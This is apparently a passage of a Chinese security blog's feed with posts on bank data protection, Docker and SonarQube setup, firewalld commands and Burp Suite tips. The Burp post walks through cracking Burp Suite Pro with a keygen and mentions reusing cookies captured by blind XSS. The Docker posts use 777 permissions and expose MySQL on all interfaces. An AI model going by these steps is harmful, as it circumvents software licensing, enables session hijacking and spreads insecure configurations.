title="建立数据保护安全培训体系"></a>建立数据保护安全培训体系</h3><p>再好的管理策略，多么完美的技术手段，如果不能得到执行者的拥护和执行，一切都将是空谈和摆设。因此，为了保证商业银行数据保护工作的有效落地，降低公司当前所面临的数据泄露风险，商业银行应当建立完备的安全培训体系，提升其安全管控水平。</p><p>完备的安全培训体系应当覆盖全员，又重点突出，既包含管理策略，又涉及技术手段；并且针对不同的人群有不同的要求和标准；</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>商业银行数据保护是一个系统工程，需要多方面的协调与配合，既涉及到组织架构的调整，也有技术手段的增加，管理策略补充，更需要长期的进行人员教育与培训。数据保护整体架构可概况如下：</p><img src="/data-sec/image-21.png" title="描述">]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;转自&lt;a href=&quot;http://blog.nsfocus.net/brief-analysis-on-the-construction-of-data-security-protection-system-in-commercial-banks/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;绿盟科技博客&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;近年来，随着商业银行信息化的发展，信息系统越来越多的使用于日常工作，成为不可或缺的工具和手段。银行通过信息化大大提高其生产效率，从传统的柜面银行与24小时自助银行，再到手机银行，微信银行。银行的业务受理无论在空间和时间上都得到了极大的拓展，依赖于信息系统的发展而运行发展并壮大；&lt;/p&gt;
&lt;p&gt;但是当银行正在利用信息化技术高效率的进行跨地域、跨国家的信息交流时，海量的如客户资料、营销方案、财务报表、研发数据等关乎企业核心竞争力的机密数据也随之被传输。信息技术本身的双刃剑特性也在组织网络中不断显现：强大的开放性和互通性催生了商业泄密、网络间谍等众多灰色名词，“力拓案”、“维基泄密”等事件让信息安全事件迅速升温，信息防泄密成为商业银行越来越关注的焦点。&lt;br&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="数据安全" scheme="http://www.pa55w0rd.club/tags/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Docker部署sonar</title>
    <link href="http://www.pa55w0rd.club/sonar/"/>
    <id>http://www.pa55w0rd.club/sonar/</id>
    <published>2019-01-08T06:06:04.000Z</published>
    <updated>2019-01-11T10:01:52.544Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Sonar是一个用于代码质量管理的开源平台，用于管理源代码的质量，可以从七个维度检测代码质量。通过插件形式，可以支持包括java,C#,C/C++,PL/SQL,Cobol,JavaScrip,Groovy等等二十几种编程语言的代码质量管理与检测。<br><a id="more"></a></p><h2 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h2><ol><li><p>获取 postgresql 的镜像</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>docker pull postgres</span><br></pre></td></tr></table></figure></li><li><p>启动 postgresql</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name postgresql -p <span class="number">5432</span>:<span class="number">5432</span> -e POSTGRES_USER=sonar -e POSTGRES_PASSWORD=sonar -e POSTGRE_DB=sonar -v /opt/sonarqube/data/postgresql/<span class="symbol">data:</span>/var/<span class="class"><span class="keyword">lib</span>/<span class="title">postgresql</span>/<span class="title">data</span> -<span class="title">d</span> <span class="title">postgres</span></span></span><br></pre></td></tr></table></figure></li></ol><p>其中 postgresql为容器名称  POSTGRES_USER POSTGRES_PASSWORD POSTGRE_DB指定postgresql的用户名密码和数据库名，/opt/sonarqube/data/postgresql/data为pg数据库文件挂载到宿主机路径</p><ol start="3"><li><p>获取 sonarqube 的镜像</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>docker pull sonarqube</span><br></pre></td></tr></table></figure></li><li><p>启动 sonarqube</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name sonarqube --link postgresql -e SONARQUBE_JDBC_URL=jdbc:postgresql:<span class="regexp">//</span>postgresql:<span class="number">5432</span><span class="regexp">/sonar -p 9001:9000 -v /</span>opt<span class="regexp">/sonarqube/</span>data<span class="regexp">/sonarqube/</span>data:<span class="regexp">/opt/</span>sonarqube<span class="regexp">/data -v /</span>opt<span class="regexp">/sonarqube/</span>data<span class="regexp">/sonarqube/</span>extensions<span class="regexp">/plugins:/</span>opt<span class="regexp">/sonarqube/</span>extensions<span class="regexp">/plugins -d sonarqube</span></span><br></pre></td></tr></table></figure></li></ol><p>其中–link postgresql 是指和 postgresql 容器连接通讯， 用网关的方式也可以 </p><p>创建/opt/sonarqube/data/sonarqube/data作为sonarqube的数据文件，<code>权限设置为777</code><br>创建/opt/sonarqube/data/sonarqube/extensions/plugins作为sonarqube的插件目录</p><h2 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h2><p>sonar使用中需要和CI工具进行配合使用进行自动化代码分析<br>与jenkins联动…</p><p>参考官方文档：<a href="https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner+for+Jenkins" target="_blank" rel="noopener">https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner+for+Jenkins</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Sonar是一个用于代码质量管理的开源平台，用于管理源代码的质量，可以从七个维度检测代码质量。通过插件形式，可以支持包括java,C#,C/C++,PL/SQL,Cobol,JavaScrip,Groovy等等二十几种编程语言的代码质量管理与检测。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>修改正在运行的docker容器的端口映射</title>
    <link href="http://www.pa55w0rd.club/docker1/"/>
    <id>http://www.pa55w0rd.club/docker1/</id>
    <published>2018-12-29T02:31:32.000Z</published>
    <updated>2018-12-29T05:43:25.796Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在创建容器时，只有自己本地使用，端口映射127.0.0.1</p><p>后面有同事也需要用这个，想要修改正在运行的容器的端口映射<br><a id="more"></a></p><h2 id="0x01-修改端口映射"><a href="#0x01-修改端口映射" class="headerlink" title="0x01 修改端口映射"></a>0x01 修改端口映射</h2><h3 id="1-确定修改容器的CONTAINER-ID"><a href="#1-确定修改容器的CONTAINER-ID" class="headerlink" title="1. 确定修改容器的CONTAINER ID"></a>1. 确定修改容器的CONTAINER ID</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker ps -a</span></span><br><span class="line"><span class="attribute">CONTAINER</span> ID        IMAGE                                      COMMAND                  CREATED             STATUS              PORTS                      NAMES</span><br><span class="line">a3ee16c438a0        mysql:<span class="number">5</span>.<span class="number">7</span>.<span class="number">13</span>                               <span class="string">"docker-entrypoint..."</span>   <span class="number">3</span> days ago          Up <span class="number">40</span> hours         <span class="number">127.0.0.1:6606</span>-&gt;<span class="number">3306</span>/tcp   open_source_mysqldb</span><br></pre></td></tr></table></figure><h3 id="2-进入目录"><a href="#2-进入目录" class="headerlink" title="2. 进入目录"></a>2. 进入目录</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># docker <span class="keyword">inspect</span> a3ee16c | <span class="keyword">grep</span> Id</span><br><span class="line"><span class="string">"Id"</span>: <span class="string">"a3ee16c438a01e7d0bfc0acf923e5c2d9ab5d68043145c7d8db782455e74147d"</span>,</span><br><span class="line"></span><br><span class="line"># cd <span class="regexp">/var/</span>lib<span class="regexp">/docker/</span>containers<span class="regexp">/a3ee16c438a01e7d0bfc0acf923e5c2d9ab5d68043145c7d8db782455e74147d</span></span><br></pre></td></tr></table></figure><h3 id="3-停止docker引擎服务"><a href="#3-停止docker引擎服务" class="headerlink" title="3. 停止docker引擎服务"></a>3. 停止docker引擎服务</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># systemctl stop docker</span></span><br></pre></td></tr></table></figure><h3 id="4-修改-hostconfig-json-和-config-v2-json"><a href="#4-修改-hostconfig-json-和-config-v2-json" class="headerlink" title="4. 修改 hostconfig.json 和 config.v2.json"></a>4. 修改 hostconfig.json 和 config.v2.json</h3><ol><li><p>修改hostconfig.json<br> 找到PortBindings，修改HostIp为 0.0.0.0</p> <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"PortBindings"</span>: &#123;</span><br><span class="line">    <span class="string">"3306/tcp"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"HostIp"</span>: <span class="string">"0.0.0.0"</span>,  // 修改<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>为<span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span></span><br><span class="line">            <span class="string">"HostPort"</span>: <span class="string">"6606"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>修改config.v2.json<br> 找到 ExposedPorts 和 Ports 对应项，修改Ports的HostIp为0.0.0.0</p> <figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Ports"</span>: &#123;</span><br><span class="line">    <span class="string">"3306/tcp"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"HostIp"</span>: <span class="string">"0.0.0.0"</span>,</span><br><span class="line">            <span class="string">"HostPort"</span>: <span class="string">"6606"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li></ol><h3 id="5-保存之后，启动docker服务，启动相应容器"><a href="#5-保存之后，启动docker服务，启动相应容器" class="headerlink" title="5. 保存之后，启动docker服务，启动相应容器"></a>5. 保存之后，启动docker服务，启动相应容器</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> docker</span><br><span class="line">docker <span class="literal">start</span> open_source_mysqldb</span><br></pre></td></tr></table></figure><p><strong>结果</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># docker ps </span><br><span class="line">CONTAINER ID        IMAGE                                      COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">a3ee16c438a0        mysql:<span class="number">5.7</span><span class="meta">.13</span>                               <span class="string">"docker-entrypoint..."</span>   <span class="number">3</span> days ago          <span class="meta">Up</span> <span class="number">13</span> seconds       <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>:<span class="number">6606</span>-&gt;<span class="number">3306</span>/tcp   open_source_mysqldb</span><br></pre></td></tr></table></figure></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://stackoverflow.com/questions/19335444/how-do-i-assign-a-port-mapping-to-an-existing-docker-container" target="_blank" rel="noopener">https://stackoverflow.com/questions/19335444/how-do-i-assign-a-port-mapping-to-an-existing-docker-container</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在创建容器时，只有自己本地使用，端口映射127.0.0.1&lt;/p&gt;
&lt;p&gt;后面有同事也需要用这个，想要修改正在运行的容器的端口映射&lt;br&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="docker" scheme="http://www.pa55w0rd.club/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>insight洞察-漏洞生命周期管理使用</title>
    <link href="http://www.pa55w0rd.club/insight/"/>
    <id>http://www.pa55w0rd.club/insight/</id>
    <published>2018-12-26T08:03:17.000Z</published>
    <updated>2018-12-26T10:10:02.641Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>洞察是宜信安全部用来对公司内部系统所出现的安全漏洞进行线上全生命周期管理的漏洞管理平台。</p><p><a href="https://github.com/creditease-sec/insight" target="_blank" rel="noopener">项目地址</a></p><p>主要由3部分组成：</p><ul><li>应用系统资产管理</li><li>漏洞生命周期管理</li><li>安全知识库管理<a id="more"></a></li></ul><p>应用系统资产管理：对公司应用系统资产进行管理，包括系统名称、域名、重要级别、部门、负责人等。</p><p>漏洞生命周期管理：对公司应用系统产生的安全漏洞进行线上提交、通告、知悉、复测、分类、风险计算、修复期限计算、邮件提醒、漏洞数据分析统计等。</p><p>安全知识库管理：对安全知识、管理制度进行集中存放、线上学习、安全培训、知识传承等。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><img src="/insight/1.jpg" title="test"><blockquote><p>点击看原图</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;洞察是宜信安全部用来对公司内部系统所出现的安全漏洞进行线上全生命周期管理的漏洞管理平台。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/creditease-sec/insight&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;项目地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;主要由3部分组成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;应用系统资产管理&lt;/li&gt;
&lt;li&gt;漏洞生命周期管理&lt;/li&gt;
&lt;li&gt;安全知识库管理
    
    </summary>
    
      <category term="安全建设" scheme="http://www.pa55w0rd.club/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="漏洞管理" scheme="http://www.pa55w0rd.club/tags/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Centos 7 使用firewalld防火墙</title>
    <link href="http://www.pa55w0rd.club/firewall/"/>
    <id>http://www.pa55w0rd.club/firewall/</id>
    <published>2018-12-13T10:57:19.000Z</published>
    <updated>2018-12-29T03:02:18.883Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>启动一个服务：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> firewalld.service</span><br></pre></td></tr></table></figure></li><li><p>关闭一个服务：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">stop</span> firewalld.service</span><br></pre></td></tr></table></figure></li><li><p>重启一个服务：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">systemctl</span> <span class="selector-tag">restart</span> <span class="selector-tag">firewalld</span><span class="selector-class">.service</span></span><br></pre></td></tr></table></figure></li><li><p>显示一个服务的状态：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">systemctl</span> <span class="selector-tag">status</span> <span class="selector-tag">firewalld</span><span class="selector-class">.service</span></span><br></pre></td></tr></table></figure></li></ul><a id="more"></a><ul><li><p>在开机时启用一个服务：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="builtin-name">enable</span> firewalld.service</span><br></pre></td></tr></table></figure></li><li><p>在开机时禁用一个服务：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="builtin-name">disable</span> firewalld.service</span><br></pre></td></tr></table></figure></li><li><p>查看服务是否开机启动：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="keyword">is</span>-enabled firewalld.service</span><br></pre></td></tr></table></figure></li><li><p>查看已启动的服务列表：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">systemctl </span><span class="built_in">list-unit-files|grep</span> <span class="string">enabled</span></span><br></pre></td></tr></table></figure></li><li><p>查看启动失败的服务列表：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="comment">--failed</span></span><br></pre></td></tr></table></figure></li><li><p>查看所有打开的端口：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=<span class="keyword">public</span> --<span class="built_in">list</span>-ports</span><br></pre></td></tr></table></figure></li><li><p>更新防火墙规则： </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-<span class="keyword">cmd</span><span class="bash"> --reload</span></span><br></pre></td></tr></table></figure></li><li><p>查看区域信息:  </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-<span class="keyword">cmd</span><span class="bash"> --get-active-zones</span></span><br></pre></td></tr></table></figure></li><li><p>添加</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">firewall</span><span class="literal">-</span><span class="comment">cmd</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">zone=public</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">add</span><span class="literal">-</span><span class="comment">port=8081/tcp</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">permanent</span>    <span class="comment">（</span><span class="literal">-</span><span class="literal">-</span><span class="comment">permanent永久生效，没有此参数重启后失效）</span></span><br></pre></td></tr></table></figure></li><li><p>重新载入</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-<span class="keyword">cmd</span><span class="bash"> --reload</span></span><br></pre></td></tr></table></figure></li><li><p>查看</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--query-port</span>=80/tcp</span><br></pre></td></tr></table></figure></li><li><p>删除</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--remove-port</span>=80/tcp --permanent</span><br></pre></td></tr></table></figure></li><li><p>添加防火墙规则（对指定IP开放指定端口） </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent <span class="attribute">--add-rich-rule</span>=<span class="string">"rule family="</span>ipv4" source <span class="attribute">address</span>=<span class="string">"192.168.142.166"</span><span class="built_in"> port </span><span class="attribute">protocol</span>=<span class="string">"tcp"</span> <span class="attribute">port</span>=<span class="string">"27017"</span> accept/drop/reject<span class="string">"</span></span><br></pre></td></tr></table></figure></li><li><p>查看配置结果，验证配置</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-<span class="keyword">cmd</span><span class="bash"> --list-all</span></span><br></pre></td></tr></table></figure></li><li><p>删除规则</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent <span class="attribute">--remove-rich-rule</span>=<span class="string">"rule family="</span>ipv4" source <span class="attribute">address</span>=<span class="string">"192.168.142.166"</span><span class="built_in"> port </span><span class="attribute">protocol</span>=<span class="string">"tcp"</span> <span class="attribute">port</span>=<span class="string">"27017"</span> accept<span class="string">"</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;启动一个服务：&lt;/p&gt;
&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systemctl &lt;span class=&quot;literal&quot;&gt;start&lt;/span&gt; firewalld.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;关闭一个服务：&lt;/p&gt;
&lt;figure class=&quot;highlight arduino&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systemctl &lt;span class=&quot;built_in&quot;&gt;stop&lt;/span&gt; firewalld.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;重启一个服务：&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;systemctl&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;restart&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;firewalld&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.service&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;显示一个服务的状态：&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;systemctl&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;firewalld&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.service&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="linux" scheme="http://www.pa55w0rd.club/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Burp Suite使用</title>
    <link href="http://www.pa55w0rd.club/burp/"/>
    <id>http://www.pa55w0rd.club/burp/</id>
    <published>2018-12-13T10:53:31.000Z</published>
    <updated>2019-03-14T06:31:27.519Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Burp Suite是Web应用程序测试的最佳工具之一，其多种功能可以帮我们执行各种任务.请求的拦截和修改,扫描web应用程序漏洞,以暴力破解登陆表单,执行会话令牌等多种的随机性检查。</p><p>大家都很熟悉工具的使用了，这里介绍几个技巧，<strong>欢迎大家补充</strong><br><a id="more"></a></p><p>详细教程参考：</p><p><strong>Burp Suite 说明书（开车版）</strong> 链接: <a href="https://pan.baidu.com/s/1tNTzSO1eKDtRg7-T0cdjVQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1tNTzSO1eKDtRg7-T0cdjVQ</a> 提取码: 8un3 复制这段内容后打开百度网盘手机App，操作更方便哦</p><p><a href="https://t0data.gitbooks.io/burpsuite/content/" target="_blank" rel="noopener">https://t0data.gitbooks.io/burpsuite/content/</a></p><h2 id="0x01-专业版激活问题"><a href="#0x01-专业版激活问题" class="headerlink" title="0x01 专业版激活问题"></a>0x01 专业版激活问题</h2><p>使用burp-loader-keygen.jar注册机激活<br><br>支持1.6-目前最新的都能使用该注册机激活<br><br>注意有人利用这个破解补丁添加后门传播病毒，<a href="https://0x00sec.org/t/malware-reversing-burpsuite-keygen/5167" target="_blank" rel="noopener">后门分析帖子》》</a><br><br>原始注册机文件的MD5<br><br>burp-loader-keygen.jar     MD5: A4A02E374695234412E2C66B0649B757<br><br>源文件MD5官网查看：<br><a href="http://releases.portswigger.net" target="_blank" rel="noopener">http://releases.portswigger.net</a></p><p>使用burp-loader-keygen.jar破解的，每次都需要在该工具上启动，或使用命令行启动<code>java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro.jar</code></p><h3 id="激活步骤"><a href="#激活步骤" class="headerlink" title="激活步骤"></a>激活步骤</h3><ol><li>首先打开burp-loader-keygen.jar</li></ol><img src="/burp/1.png" title="test"><ol start="2"><li>点击burp，将复制内容粘贴到Enter license key,点击next</li></ol><img src="/burp/2.png" title="2test"><ol start="3"><li>点击Manual activation</li></ol><img src="/burp/3.png" title="2test"><ol start="4"><li>复制2 中的内容</li></ol><img src="/burp/4.png" title="2test"><ol start="5"><li>将复制内容粘贴到burp-loader-keygen.jar中的Activation Request，下方Activation Response会生成key，复制</li></ol><img src="/burp/5.png" title="2test"><ol start="6"><li>回到burp，将复制内容粘贴到3中，点击next，激活成功</li></ol><img src="/burp/6.png" title="2test"><img src="/burp/license.png" title="license"><h2 id="0x02-中文显示乱码问题"><a href="#0x02-中文显示乱码问题" class="headerlink" title="0x02 中文显示乱码问题"></a>0x02 中文显示乱码问题</h2><p>User options –Display – HTTP Message Display – Change font…<br>选择一个中文的字体格式，调整显示字体大小</p><img src="/burp/font.png" title="中文乱码"><h2 id="0x03-拦截响应包"><a href="#0x03-拦截响应包" class="headerlink" title="0x03 拦截响应包"></a>0x03 拦截响应包</h2><p>很多时候，在测试验证码等认证漏洞的时候，只在前端验证，可以通过修改响应包中的值绕过验证</p><p>Proxy – Options – Intercept Server Responses 勾选启用</p><img src="/burp/responses.png" title="responses"><h2 id="0x04-拦截指定url的请求响应包"><a href="#0x04-拦截指定url的请求响应包" class="headerlink" title="0x04 拦截指定url的请求响应包"></a>0x04 拦截指定url的请求响应包</h2><p>请求包设置</p><p>Proxy – Options – Intercept Client Requests – Add</p><img src="/burp/intercept_requests.png" title="intercept_requests"><p>响应包设置</p><p>Proxy – Options – Intercept Server Responses – Add，同上图设置</p><h2 id="0x05-自动替换cookie等"><a href="#0x05-自动替换cookie等" class="headerlink" title="0x05 自动替换cookie等"></a>0x05 自动替换cookie等</h2><p>如盲打xss，接收到cookie后，需要在每个请求包中都替换cookie</p><p>Proxy – Options – Match and Replace – Add(增加其他自动替换同理，可以自动替换请求/响应内容，这里以cookie为例)</p><img src="/burp/replace.png" title="replace"><h2 id="0x06-生成csrf-poc"><a href="#0x06-生成csrf-poc" class="headerlink" title="0x06 生成csrf poc"></a>0x06 生成csrf poc</h2><p>对拦截的请求，右键</p><img src="/burp/csrf.png" title="csrf"><h2 id="0x07-条件竞争漏洞测试"><a href="#0x07-条件竞争漏洞测试" class="headerlink" title="0x07 条件竞争漏洞测试"></a>0x07 